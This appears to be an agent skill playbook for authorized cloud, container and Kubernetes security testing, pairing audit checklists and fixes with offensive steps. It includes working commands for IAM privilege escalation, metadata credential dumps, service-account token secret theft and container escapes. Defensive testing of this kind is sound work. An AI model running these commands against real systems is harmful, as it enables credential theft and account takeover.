# Cloud, Container & Kubernetes Playbook

Authorized security testing only. Preserve the remediation-oriented framing of the source skills: every finding ships with a fix and a verification note. Report each finding as **misconfig -> reachable identity/data -> blast radius**, with the exact CLI/IaC remediation (10-cloud-security v3.0).

## When this applies

Route an engagement here when the target shows any of:
- Cloud provider footprint — AWS (`aws`), GCP (`gcloud`/`gsutil`), Azure (`az`) CLIs available, or you have keys/creds/SSO.
- IaC in the repo — Terraform (`*.tf`), CloudFormation, Pulumi, Helm charts, Kustomize overlays, K8s manifests (`*.yaml`/`*.yml`).
- Containers / orchestration — Dockerfiles, base images, registries, CI build pipelines producing images; vanilla K8s, EKS, GKE, AKS, OpenShift, ECS Fargate, Cloud Run, Fly.io.
- Identity surface — IAM users/roles/policies, service accounts, Okta/Entra ID/Auth0/Google Workspace, federation (SAML/OIDC), JIT/break-glass.
- Signals from recon — `169.254.169.254` reachable via SSRF, exposed metadata, public buckets, OIDC trust to CI/CD, leaked access keys (`AKIA...`).

Think in **attack paths** (CNAPP/CSPM-style), not isolated misconfigs. **Identity is the perimeter.**

---

## Methodology

### Phase 1 — Scope & map
1. Identify provider(s), account/project/subscription IDs, regions, and whether you are reviewing **live infra** (CLI access) or **IaC files** (static review) — they need different tooling (cloud-audit).
2. Inventory the container surface — Dockerfiles, base images, registries, Helm/Kustomize, K8s manifests, the CI pipelines that build images (container-audit).
3. Identify the runtime (EKS/GKE/AKS/OpenShift/Fargate/Cloud Run), the **network model** (mesh, ingress, default-deny vs default-allow), and the **secret model** (K8s Secrets base64-only, External Secrets Operator, sealed-secrets, Vault, Doppler) (container-audit).
4. Confirm who you are: `aws sts get-caller-identity`, `az account show` / `az ad signed-in-user show`, `gcloud config list` (exploiting-cloud-platforms).

### Phase 2 — Recon / enumerate
5. **Identity first.** Pull the full identity graph — IAM users/roles/policies, service accounts, role bindings, credential reports, access analyzer findings. Enumerate **privilege-escalation paths**, not just static perms (10-cloud-security v3.0).
6. **Storage.** Enumerate every bucket/container/blob; test public + unauthenticated access.
7. **Network.** Find `0.0.0.0/0` ingress on sensitive ports, missing flow logs, public DBs.
8. **Compute / metadata.** Check IMDSv2 enforcement; if you have SSRF or in-instance access, hit the metadata service.
9. **Containers / K8s.** Statically scan Dockerfiles + manifests, then check live cluster posture (RBAC, PSS, NetworkPolicy, runtime).
10. **Logging.** Verify CloudTrail / Cloud Audit Logs / Activity Log + threat detection (GuardDuty / SCC / Defender) are on — gaps here are both a finding and an OPSEC consideration.

### Phase 3 — Test & build attack paths
11. Chain reachable findings: public/SSRF-reachable surface -> credential or token -> identity -> privesc -> blast radius (data, lateral, account takeover).
12. For each candidate privesc, confirm the *specific* permission exists (e.g. `iam:PassRole`, `iam:CreatePolicyVersion`) before claiming exploitability — see Gotchas.

### Phase 4 — Verify & report
13. Prove each finding with evidence (CLI output, config snippet, line:col). Flag low-confidence as **"Potential"** not confirmed (container-audit).
14. Verify hardening fixes at runtime — many break availability (Section: Verify fixes).
15. Use the three-disposition rule **Fixed / Deferred / Accepted Risk** and the `misconfig -> reachable identity/data -> blast radius` structure (owasp-audit, 10-cloud-security).

---

## High-signal checklist — CROWN JEWELS

### AWS identity & privesc (iam-audit, exploiting-cloud-platforms)
- Enumerate baseline: `aws sts get-caller-identity`, `aws iam generate-credential-report && aws iam get-credential-report --output text --query Content | base64 -d`, `aws iam get-account-authorization-details`, `aws accessanalyzer list-findings`.
- **Wildcard grants** — `"Action": "*"` and/or `"Resource": "*"` outside break-glass roles. CWE-269.
- **`AdministratorAccess`** policy attachments — flag and justify every one.
- **Permissions boundaries** must be set on every role that can create roles — prevents privesc via `iam:CreateRole` + `iam:AttachRolePolicy`.
- **Cross-account trust** — `Principal: { AWS: "*" }` is open to the world; require specific account IDs + optional `aws:PrincipalOrgID` condition.
- **Shadow admin** — a non-admin role that can `iam:AssumeRole` (transitively) into admin.
- The classic AWS IAM privesc primitives (confirm the permission, then it's exploitable):
  - `iam:CreatePolicyVersion` / `iam:SetDefaultPolicyVersion` — rewrite or roll back a policy you're attached to.
  - `iam:PassRole` + `lambda:CreateFunction` (+`lambda:InvokeFunction`) — run code as a higher-privileged role.
  - `iam:AttachUserPolicy` / `iam:PutUserPolicy` — attach `AdministratorAccess` / inline policy to self.
  - `iam:CreateAccessKey` — mint keys for another (admin) user: `aws iam create-access-key --user-name admin-user`.
  - `iam:UpdateAssumeRolePolicy` — rewrite a role's trust to let you assume it.
- **PassRole + Lambda full chain:** `aws lambda create-function --function-name evil --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/AdminRole --handler lambda_function.lambda_handler --zip-file fileb://function.zip` then `aws lambda invoke --function-name evil output.txt`.
- **IMDSv2** enforced on every launch template: `MetadataOptions.HttpTokens: required` (and require **hop-limit 1**) — the Capital-One-class control.
- Service-linked roles audited (they bypass normal restrictions); service-account/access-key sprawl removed.

### AWS storage / network / logging (cloud-audit, cloud_auditor.py)
- **S3 Block Public Access** at account *and* bucket level — all four flags: `BlockPublicAcls`, `IgnorePublicAcls`, `BlockPublicPolicy`, `RestrictPublicBuckets`. Partial = `S3-PARTIAL-PUBLIC-BLOCK` HIGH.
  - Enumerate: `aws s3api list-buckets`; per bucket `get-public-access-block`, `get-bucket-acl`, `get-bucket-policy`, `get-bucket-policy-status`, `get-bucket-encryption`, `get-bucket-versioning`.
  - Public ACL test (offensive): `aws s3 ls s3://bucket --no-sign-request` and `curl https://bucket.s3.amazonaws.com/`.
  - Fix: `aws s3api put-public-access-block --bucket NAME --public-access-block-configuration BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true`.
- **Security groups** — `0.0.0.0/0` to **port 22 (SSH)** = `SG-SSH-OPEN` HIGH, **port 3389 (RDP)** = `SG-RDP-OPEN` HIGH, protocol `-1` (all) = `SG-ALL-TRAFFIC-OPEN`. Hunt: `aws ec2 describe-security-groups --filters "Name=ip-permission.cidr,Values=0.0.0.0/0"`.
- **CloudTrail** — none in a region = `CLOUDTRAIL-DISABLED` CRITICAL; not multi-region = MEDIUM; no `LogFileValidationEnabled` = MEDIUM. Check: `aws cloudtrail describe-trails`, `aws cloudtrail get-trail-status --name NAME`.
- **Quick wins to grab:** unencrypted EBS snapshots, public RDS (`aws rds describe-db-instances --query 'DBInstances[*].[DBInstanceIdentifier,PubliclyAccessible]'`), Lambda env-var secrets (`aws lambda get-function-configuration`), public EBS snapshots (`aws ec2 describe-snapshots --owner-ids ACCT --restorable-by-user-ids all`), Secrets Manager (`aws secretsmanager get-secret-value --secret-id NAME`).

### GCP identity & storage (cloud-audit, iam-audit, cloud_auditor.py)
- **Public IAM bindings** — `allUsers` / `allAuthenticatedUsers` on any resource = `GCP-IAM-PUBLIC-BINDING` CRITICAL.
- **Primitive roles** — `roles/owner` / `roles/editor` on users = `GCP-IAM-PRIMITIVE-ROLE` HIGH; replace with predefined/custom roles.
- **Service-account self-impersonation** — SA holding `iam.serviceAccountTokenCreator` on itself = privesc.
- **SA keys downloaded** (`projects.serviceAccounts.keys.create`) should be zero — use Workload Identity Federation instead.
- Org-level vs project-level bindings — over-scoped org bindings silently grant every project.
- Enumerate: `gcloud projects get-iam-policy $PROJECT_ID`, `gcloud iam service-accounts list`, `gcloud asset analyze-iam-policy`, `gcloud policy-intelligence query-activity`, Recommender API.
- Public GCS bucket = `GCS-PUBLIC-BUCKET`: `gsutil iam get gs://bucket`; unauth test `curl https://storage.googleapis.com/bucket/file.txt`.

### Azure identity & network (cloud-audit, iam-audit, cloud_auditor.py)
- **Owner/Contributor** at subscription/management-group scope, custom roles with `*` actions.
- **PIM** must cover all Global Admin / Privileged Role Admin / Application Admin; **Conditional Access** must cover *every* sign-in surface (legacy auth, service principals; break-glass excluded with explicit reason).
- **Legacy auth** (IMAP/POP/SMTP basic auth) bypasses MFA — block it. Service principal client secrets must expire/rotate (check expiry).
- **NSG unrestricted inbound** — `direction=Inbound`, `access=Allow`, `sourceAddressPrefix in (*, Internet, 0.0.0.0/0)`, port in `22 / 3389 / *` = `NSG-UNRESTRICTED-INBOUND` HIGH.
- `allowBlobPublicAccess==true` storage accounts = public blob risk: `az storage account list --query "[?allowBlobPublicAccess==true].name"`.
- Enumerate: `az role assignment list --all`, `az ad signed-in-user show`, `az keyvault secret list --vault-name NAME`.

### Metadata / IMDS abuse (exploiting-cloud-platforms, 10-cloud-security)
When you have in-instance access or SSRF, the metadata service is the pivot to cloud credentials:
- **AWS** — `curl http://169.254.169.254/latest/meta-data/iam/security-credentials/` then `/<role-name>` to dump temp creds. IMDSv2 (token-required, hop-limit 1) is the remediation; validate it's enforced.
- **Azure** — `curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"` to grab a managed-identity token.
- **GCP** — `curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"`. Recursive dump: `.../computeMetadata/v1/?recursive=true`.

### Dockerfile (container-audit, 10-cloud-security, iac_scanner.py)
- **Base image pinned by digest**, not tag — `FROM node:20@sha256:...` not `FROM node:20`. Never `:latest`. Grep: `FROM .*:latest`, `FROM .*:[0-9]+$` (tag without digest). `DF-002`.
- **Non-root** — a `USER 1001` (non-zero UID) directive *after the last `FROM`*. Absence or `USER root` = `DF-001` HIGH. (Trap: `USER` before a later `FROM` in a multi-stage build does not count.)
- **Build-arg secrets** end up in image layers — use BuildKit `--mount=type=secret`, not `--build-arg`. Grep: `ARG .*KEY`, `ARG .*TOKEN`, `ARG .*SECRET`, `ENV .*=.*[A-Za-z0-9]{32,}`. `DF-003` (`ENV \S*(PASSWORD|SECRET|KEY|TOKEN)\s*=`).
- **`COPY . .`** ships `.git`, `.env`, `*.pem`, `.aws/`, `.ssh/` — require a `.dockerignore`.
- **`ADD <url>`** follows redirects and skips checksum verification — prefer `RUN curl ... && sha256sum -c`. `DF-004`: `ADD` used (non-http).
- Multi-stage build to discard build tooling; no shells/package managers in final stage (distroless / `FROM scratch`). No `chmod 4755` SUID binaries; no `apt-get install ... sudo` (`DF-006`). `HEALTHCHECK` defined (`DF-005`). Grep: `USER root`, `chmod 4755`, `apt-get install.*sudo`.
- Multi-stage hardened pattern: `FROM ... AS builder` -> `FROM ... AS runtime`, `COPY --from=builder ...`, `useradd -r appuser`, `USER appuser`, single `EXPOSE`, `HEALTHCHECK`.

### Kubernetes pod security (container-audit, 10-cloud-security, iac_scanner.py)
- `securityContext.runAsNonRoot: true` + non-zero `runAsUser`; missing = `K8S-002` HIGH. `runAsUser: 0` is a finding.
- `allowPrivilegeEscalation: false`; `readOnlyRootFilesystem: true` (+ explicit `emptyDir` for writable paths); `capabilities.drop: ["ALL"]` then add back only what's needed (e.g. `NET_BIND_SERVICE`); `seccompProfile.type: RuntimeDefault`.
- **`privileged: true`** = `K8S-001` CRITICAL — never in app workloads (rare legit: Falco, kube-proxy, some CSI drivers).
- **`hostNetwork` / `hostPID` / `hostIPC`** true = container sees/talks to the node (`K8S-004`/`K8S-005` HIGH). **`hostPath`** volumes = node-escape risk; review each.
- Every container has `resources.requests` + `resources.limits` (missing limits = noisy-neighbor DoS; `K8S-003`). `LimitRange` + `ResourceQuota` per namespace.
- Grep manifests: `privileged: true`, `runAsUser: 0`, `hostNetwork: true`, `hostPath:`, `verbs: ["*"]`, `resources: ["*"]`, `apiGroups: ["*"]`, `system:authenticated`.

### Kubernetes RBAC / PSS / network / secrets (container-audit)
- No `ClusterRole` with `*` verbs on `*` resources except `cluster-admin` (audit who's bound). `ServiceAccount` per workload, not shared `default`. `automountServiceAccountToken: false` where API access isn't needed. Bindings of `system:authenticated` are visible to every workload — almost always wrong.
- Cluster enforces **PSS `restricted`** profile via Pod Security Admission (or OPA Gatekeeper / Kyverno). PodSecurityPolicy is **deprecated 1.21, removed 1.25** — confirm a *current* admission controller, not PSP.
- **NetworkPolicy** per namespace, **default-deny ingress AND egress**, then allow specific pods. Missing = every pod can reach every pod *and the metadata service + kube-apiserver*. Service-mesh mTLS in **STRICT** mode (not PERMISSIVE) for sensitive namespaces.
- **K8s Secrets are base64, NOT encrypted** — plain bytes in etcd by default. Require etcd encryption at rest (`--encryption-provider-config` on kube-apiserver). Consume via projected volumes, not env vars (env leaks via `/proc/<pid>/environ`, crash dumps). Grep Git for `kind: Secret` with `data:` (committed base64).
- **Image policy** — all images from approved registries enforced via Gatekeeper/Kyverno/image-policy-webhook; signature verification via cosign + sigstore policy controller (or Notary v2); pin by digest `image@sha256:...`.

### K8s offensive enumeration (exploiting-containers)
- In-pod detection: `ls -la /.dockerenv`, `cat /proc/1/cgroup | grep -E 'docker|kubepods'`, `env | grep KUBERNETES`.
- SA token at `/run/secrets/kubernetes.io/serviceaccount/token`; hit the API:
  ```
  TOKEN=$(cat /run/secrets/kubernetes.io/serviceaccount/token)
  APISERVER=https://kubernetes.default.svc
  NS=$(cat /run/secrets/kubernetes.io/serviceaccount/namespace)
  curl -k $APISERVER/api/v1/namespaces/$NS/secrets --header "Authorization: Bearer $TOKEN"
  ```
- Decode secrets: `kubectl get secrets -o json | jq -r '.items[].data | to_entries[] | "\(.key): \(.value | @base64d)"'`.
- Privesc pod: `hostNetwork/hostPID/hostIPC: true`, `securityContext.privileged: true`, `hostPath` mount of `/`, `chroot /host`.

### Container escape primitives (exploiting-containers — for verifying blast radius)
- **Capabilities** — `capsh --decode=$(grep CapEff /proc/self/status | awk '{print $2}')`. `CAP_SYS_ADMIN` (mount/modules), `CAP_SYS_PTRACE` (`gdb -p 1`), `CAP_SYS_MODULE`, `CAP_DAC_READ_SEARCH`, `CAP_SYS_RAWIO`.
- **Privileged escape** — `fdisk -l`; `mount /dev/sda1 /mnt/host`; `chroot /mnt/host /bin/bash`.
- **Docker socket** mounted (`/var/run/docker.sock`) = game over: `docker run -v /:/mnt --rm -it alpine chroot /mnt sh` or `docker run -v /:/hostfs --privileged -it ubuntu bash`.
- **cgroup `release_agent`** escape (writable cgroup) — abuses `notify_on_release`.
- Kernel escapes: **CVE-2019-5736** (runc binary overwrite), **CVE-2022-0847** Dirty Pipe (5.8-5.16.11), **CVE-2016-5195** DirtyCow.

### IaC static patterns (iac_scanner.py, 10-cloud-security)
- **Terraform** — `cidr_blocks = ["0.0.0.0/0"]` = `TF-002` CRITICAL; `publicly_accessible = true` (RDS) = `TF-003` HIGH; `"Action" : "*"` = `TF-005` HIGH; `aws_s3_bucket` without `server_side_encryption_configuration` = `TF-001` HIGH; `aws_cloudtrail` without `enable_logging = true` = `TF-004` MEDIUM. Insecure tell: `acl = "public-read"`.
- Fix pattern for S3: add `aws_s3_bucket_public_access_block` with all four `block_*` / `ignore_*` / `restrict_*` = true.

### Useful one-liners (container-audit)
```bash
# All Dockerfiles + their first FROM
git ls-files | grep -E '(^|/)Dockerfile(\.|$)' | xargs -I{} sh -c 'echo "==> {}"; grep ^FROM "{}"'
# Manifests missing securityContext
grep -rL "securityContext" --include="*.yaml" --include="*.yml" .
# Privileged containers
grep -rln "privileged: *true" --include="*.yaml" --include="*.yml" .
# hostPath volumes
grep -rln "hostPath:" --include="*.yaml" --include="*.yml" .
# Committed K8s Secrets (base64 but readable)
grep -rln "kind: *Secret" --include="*.yaml" --include="*.yml" . | xargs grep -l "^data:"
```

---

## Tools & commands

Only tools/flags named in the source skills:

- **CLIs:** `aws` (`iam`, `s3api`, `ec2`, `cloudtrail`, `sts`, `lambda`, `rds`, `secretsmanager`, `accessanalyzer`), `az`, `gcloud` / `gsutil`, `kubectl`.
- **Multi-cloud audit:** `ScoutSuite` (`scout.py aws|azure|gcp`), `Prowler` (`./prowler -M csv`).
- **AWS offensive frameworks:** `Pacu`, `WeirdAAL`.
- **Azure:** `MicroBurst` (`Invoke-EnumerateAzureBlobs`, `Invoke-EnumerateAzureSubDomains`), `ROADtools` (`roadrecon auth|gather|gui`).
- **Bucket brute:** `s3scanner`, `S3 Inspector` (`s3inspector.py`), `GCPBucketBrute` (`gcpbucketbrute.py -k company`).
- **IaC scanners:** `Checkov` (`checkov -d ./terraform/ --framework terraform`; `--framework kubernetes`), `tfsec` (`tfsec ./terraform/ --format json --out ...`), `Terrascan`, `Trivy` (`trivy config ./terraform/`, `trivy config ./k8s-manifests/`).
- **Image scanning:** `trivy image --severity HIGH,CRITICAL <image>`, `grype`, `docker scout cves`, `dive image:tag`.
- **K8s posture:** `kube-bench run --targets master,node,policies` (aquasec/kube-bench), `kube-hunter --remote <api>`, `kubeaudit all`, `kubectl-who-can create pods`, `kubectl auth can-i`.
- **Container enum:** `deepce.sh`, `CDK` (`./cdk evaluate`, `./cdk run <exploit>`).
- **Docker runtime:** `docker/docker-bench-security`.
- **Runtime detection (defensive / OPSEC awareness):** `Falco`, `Tracee`, `Tetragon` (eBPF) — catch "shell spawned in a pod that never opens a shell", container escape, crypto-mining.
- **Bundled scripts (10-cloud-security):**
  - `python scripts/cloud_auditor.py --provider aws --profile default --region us-east-1` (also `--provider gcp --project ID`, `--provider azure --subscription ID`, `-o report.json`).
  - `python scripts/iac_scanner.py --path ./terraform/ --output findings.json` (`--type auto|terraform|docker|kubernetes`).
- **Supply chain:** cosign + sigstore policy controller / Notary v2 (signing/verification), SLSA provenance.

---

## Expert gotchas / bypasses

- **Read-only during audit.** Never `kubectl delete`/modify cluster state, no `iam:AttachPolicy`/role creation/user disablement. Use `get`, `describe`, `auth can-i`. For runtime evidence prefer a non-disruptive ephemeral `kubectl run -it --rm debug ... curl` over touching live workloads. Escalating a found weakness to a full pivot is *exploitation, not audit* — refuse cluster-takeover scope (container-audit, iam-audit).
- **Confirm the privesc permission before claiming it.** "Shadow admin" requires the *transitive* `AssumeRole` chain to actually resolve. PassRole+Lambda needs `iam:PassRole` **and** `lambda:CreateFunction` **and** the target role's trust to allow `lambda.amazonaws.com`. Document the chain; flag unproven ones as **Potential** (container-audit).
- **`USER` directive placement** — a non-root `USER` *before* a later `FROM` stage is ignored; the final stage's user wins. The `DF-001` check specifically looks at `USER` relative to the **last** `FROM`. Don't false-pass a multi-stage build.
- **K8s Secrets "encryption" trap** — base64 is encoding, not encryption. A repo full of `kind: Secret` with `data:` fields is plaintext-at-rest unless etcd encryption *and* a secrets bridge (ESO/Vault/sealed-secrets) are in place.
- **PSP is dead** — if a cluster claims pod security via PodSecurityPolicy, that's a finding: PSP removed in 1.25. Verify Pod Security Admission (`restricted`) or Gatekeeper/Kyverno is the *actual* enforcer.
- **Default-deny NetworkPolicy breaks things silently** — after rollout, legitimate traffic can partial-outage with no error. Verify with an in-cluster `kubectl run -it --rm debug ... curl` before signing off. Same caution: tightening a security group can break connectivity — always note availability impact (cloud-audit, container-audit).
- **`runAsNonRoot: true` crashloops** if the image's `ENTRYPOINT` calls `chown`/writes outside `/tmp`. `readOnlyRootFilesystem: true` breaks apps that write log/PID/tmp files. Verify the pod stays Running, not just that admission accepts it.
- **MFA bypass via legacy auth** — accounts that "have MFA" are still reachable via IMAP/POP/SMTP basic auth or unprotected service principals. Test the legacy surface, not just the modern one (iam-audit).
- **Missing public-access-block != public** but is still HIGH — absence of the block is the finding even if the bucket isn't currently public (a single ACL change exposes it). Conversely, a bucket with all four blocks set is safe even with a permissive-looking policy.
- **Metadata hop-limit** — IMDSv2 token-required alone isn't enough; SSRF through a proxy can still relay. Require **hop-limit 1** so a containerized/proxied request can't reach IMDS (10-cloud-security).
- **Stale break-glass** — emergency accounts untested 12+ months are a finding: nobody knows if they work, and they often have standing admin (iam-audit).
- **Service-account self-impersonation (GCP)** is subtle — a SA with `serviceAccountTokenCreator` on *itself* is a self-privesc loop that static role review misses.
- **OPSEC / logging gaps cut both ways** — CloudTrail/GuardDuty disabled is a finding for the client *and* the reason a noisy enum may go unnoticed; in authorized testing, still assume Falco/Tetragon/GuardDuty may alert and coordinate with the blue team.

---

## Delegate to

Invoke these specialist source skills via the Skill tool for a full-depth pass:

- **cloud-audit** — use when you need the full multi-cloud posture review (IAM/network/storage/compute/logging/secrets) across AWS+GCP+Azure with the standard report format.
- **container-audit** — use for the deep Docker/Helm/Kustomize/K8s manifest + cluster-posture audit (PSS, RBAC, NetworkPolicy, image policy, runtime) and fix-verification methodology.
- **iam-audit** — use for consultant-grade identity work: role design, JIT/break-glass, workload identity federation, IdP (Okta/Entra/Auth0) review, and migration plans (audit/design/migrate modes).
- **10-cloud-security** — use to run the bundled `cloud_auditor.py` / `iac_scanner.py`, get CIS/SOC2/PCI/HIPAA compliance mapping, and attack-path-driven (CNAPP-style) framing.
- **exploiting-cloud-platforms** (secskills) — use for authorized offensive cloud testing: bucket hunting, IAM privesc chains, metadata abuse, serverless exploitation, Pacu/ScoutSuite/MicroBurst/ROADtools.
- **exploiting-containers** (secskills) — use for authorized container-escape and K8s-cluster exploitation: capability abuse, Docker-socket/privileged escape, SA-token API abuse, registry exploitation.

Cross-reference partners: `secrets-audit` (secrets-manager hygiene/rotation), `dependency-audit` (package CVEs inside the app image).
